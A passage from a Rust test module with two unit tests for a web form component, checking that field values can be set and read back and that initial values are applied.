	}

	#[rstest]
	fn test_form_component_get_set_value() {
		let metadata = FormMetadata {
			fields: vec![FieldMetadata {
				name: "name".to_string(),
				label: Some("Name".to_string()),
				required: false,
				help_text: None,
				widget: Widget::TextInput,
				initial: None,
			}],
			initial: HashMap::new(),
			prefix: String::new(),
			is_bound: false,
			errors: HashMap::new(),
			validation_rules: Vec::new(),
			non_field_errors: Vec::new(),
		};

		let component = FormComponent::new(metadata, "/api/submit");

		assert_eq!(component.get_value("name"), "");

		component.set_value("name", "John Doe");
		assert_eq!(component.get_value("name"), "John Doe");
	}

	#[rstest]
	fn test_form_component_with_initial_values() {
		let mut initial = HashMap::new();
		initial.insert("username".to_string(), serde_json::json!("john_doe"));

		let metadata = FormMetadata {
			fields: vec![FieldMetadata {
				name: "username".to_string(),
				label: Some("Username".to_string()),
				required: false,
				help_text: None,
				widget: Widget::TextInput,
				initial: None,
			}],
			initial,
			prefix: String::new(),
			is_bound: false,
			errors: HashMap::new(),
			validation_rules: Vec::new(),
			non_field_errors: Vec::new(),
		};

		let component = FormComponent::new(metadata, "/api/submit");

		assert_eq!(component.get_value("username"), "john_doe");
	}
}
